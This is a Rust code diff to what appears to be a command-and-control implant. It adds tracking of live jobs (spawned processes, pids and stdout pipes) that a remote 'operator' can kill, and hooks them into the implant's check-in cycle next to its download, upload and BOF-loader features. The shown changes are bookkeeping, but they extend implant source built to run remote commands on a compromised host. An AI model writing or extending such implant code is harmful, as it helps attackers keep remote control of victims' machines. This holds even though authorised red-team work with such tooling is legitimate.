@@ -74,6 +74,11 @@ pub struct Instance {
     pub results_len: usize,
     /// Active download (one at a time; the operator queues them anyway).
     pub download: Option<crate::tasks::DownloadState>,
+    /// Live jobs (ps run): the process handle, its pid and the stdout
+    /// pipe read end. The id is the original task id (the operator kills
+    /// by this id).
+    pub jobs: [crate::tasks::Job; crate::tasks::MAX_JOBS],
+    pub jobs_len: usize,
     /// Active upload accumulation (one at a time).
     pub upload: Option<crate::tasks::UploadState>,
     /// BOF runtime outputs waiting for the next POSTs (one BOF at a time).
@@ -361,6 +366,8 @@ unsafe fn bootstrap() -> Option<Instance> {
         #[allow(invalid_value, clippy::uninit_assumed_init)]
         results: core::mem::MaybeUninit::uninit().assume_init(),
         results_len: 0,
+        jobs: [crate::tasks::Job::EMPTY; crate::tasks::MAX_JOBS],
+        jobs_len: 0,
         download: None,
         upload: None,
         bof_pending: None,
@@ -535,6 +542,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     let mut chunk: [u8; 48 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
     crate::tasks::download_tick(instance, &mut w, &mut chunk);
     crate::coff::bof_tick(instance, &mut w);
+    crate::tasks::jobs_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
         crate::runtime::debug::log(instance, b"ci: fail results\n");
         return;
